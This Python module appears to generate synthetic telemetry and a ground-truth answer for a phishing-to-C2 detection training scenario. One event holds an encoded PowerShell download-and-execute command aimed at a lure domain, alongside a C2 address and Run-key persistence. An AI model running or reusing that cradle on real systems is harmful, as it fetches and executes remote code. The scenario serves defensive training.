"""Scenario PHISH-001: phishing attachment -> Office -> PowerShell -> payload -> C2."""
from __future__ import annotations

from app.scenarios.base import Ctx, register

C2_IP = "185.220.101.45"
HOST = "win-01.corp.local"
USER = "jsmith"
LURE_DOMAIN = "cdn-update-check.net"
OFFICE = "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE"
PS = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"


def generate(ctx: Ctx) -> tuple[list[dict], dict]:
    events: list[dict] = []

    # user starts the workday
    events.append(ctx.ev("E1", 0, Time=ctx.ts(0), EventID=4624, Computer=HOST,
                         User=USER, IpAddress="10.0.0.15", LogonType=3, source="windows-security"))

    # opens the lure document (macro payload)
    events.append(ctx.ev("E2", 20, Time=ctx.ts(20), EventID=1, Computer=HOST, User=USER,
                         Image=OFFICE, ParentImage="C:\\Windows\\explorer.exe",
                         CommandLine=f'"{OFFICE}" /n "C:\\Users\\{USER}\\Downloads\\INVOICE_88231.docm"',
                         ProcessId=5100, ParentProcessId=2244, source="sysmon"))
    events.append(ctx.ev("E3", 22, Time=ctx.ts(22), EventID=11, Computer=HOST, User=USER,
                         TargetFilename=f"C:\\Users\\{USER}\\AppData\\Local\\Temp\\~DF882A.tmp",
                         Image=OFFICE, ProcessId=5100, source="sysmon"))

    # macro spawns encoded PowerShell
    events.append(ctx.ev("E4", 26, Time=ctx.ts(26), EventID=1, Computer=HOST, User=USER,
                         Image=PS, ParentImage=OFFICE,
                         CommandLine="powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdQBwAGQAYQB0AGUALQBjAGQAbgAtAGwAaXZlAC4AbgBlAHQALwB0AC4AcABzADEAJwApAA==",
                         ProcessId=5210, ParentProcessId=5100, source="sysmon"))

    # resolution + staging + download
    events.append(ctx.ev("E5", 29, Time=ctx.ts(29), EventID=22, Computer=HOST, User=USER,
                         QueryName=LURE_DOMAIN, Image=PS, ProcessId=5210, source="sysmon"))
    events.append(ctx.ev("E6", 32, Time=ctx.ts(32), EventID=11, Computer=HOST, User=USER,
                         TargetFilename=f"C:\\Users\\{USER}\\AppData\\Roaming\\Microsoft\\Templates\\normal.png.exe",
                         Image=PS, ProcessId=5210, source="sysmon"))
    events.append(ctx.ev("E7", 34, Time=ctx.ts(34), EventID=3, Computer=HOST, User=USER,
                         Image=PS, ProcessId=5210, DestinationIp=C2_IP, DestinationPort=443,
                         Protocol="tcp", source="sysmon"))

    # dropper runs and persists
    events.append(ctx.ev("E8", 38, Time=ctx.ts(38), EventID=1, Computer=HOST, User=USER,
                         Image=f"C:\\Users\\{USER}\\AppData\\Roaming\\Microsoft\\Templates\\normal.png.exe",
                         ParentImage="C:\\Windows\\explorer.exe",
                         CommandLine=f'"C:\\Users\\{USER}\\AppData\\Roaming\\Microsoft\\Templates\\normal.png.exe" -s',
                         ProcessId=6002, ParentProcessId=2244, source="sysmon"))
    events.append(ctx.ev("E9", 42, Time=ctx.ts(42), EventID=13, Computer=HOST, User=USER,
                         TargetFilename="HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDriveSync",
                         Details=f"C:\\Users\\{USER}\\AppData\\Roaming\\Microsoft\\Templates\\normal.png.exe",
                         Image=f"C:\\Users\\{USER}\\AppData\\Roaming\\Microsoft\\Templates\\normal.png.exe",
                         ProcessId=6002, source="sysmon"))
    events.append(ctx.ev("E10", 47, Time=ctx.ts(47), EventID=3, Computer=HOST, User=USER,
                         Image=f"C:\\Users\\{USER}\\AppData\\Roaming\\Microsoft\\Templates\\normal.png.exe",
                         ProcessId=6002, DestinationIp=C2_IP, DestinationPort=8080,
                         Protocol="tcp", source="sysmon"))

    ground_truth = {
        "chain_events": [f"E{i}" for i in range(1, 11)],
        "techniques": ["T1566.001", "T1059.001", "T1027", "T1105", "T1071.004", "T1071.001", "T1547.001"],
        "tactics": ["INITIAL ACCESS", "EXECUTION", "PERSISTENCE", "COMMAND AND CONTROL"],
        "narrative": "Macro-enabled document spawns encoded PowerShell, downloads a payload, "
                     "establishes Run-key persistence and opens a C2 channel.",
        "primary_host": HOST,
        "attacker_ip": C2_IP,
    }
    return events, ground_truth


register(
    "PHISH-001",
    "Phishing Attachment to C2",
    "Spearphishing attachment -> Office macro -> encoded PowerShell -> payload -> persistence -> C2.",
    False,
    generate,
)
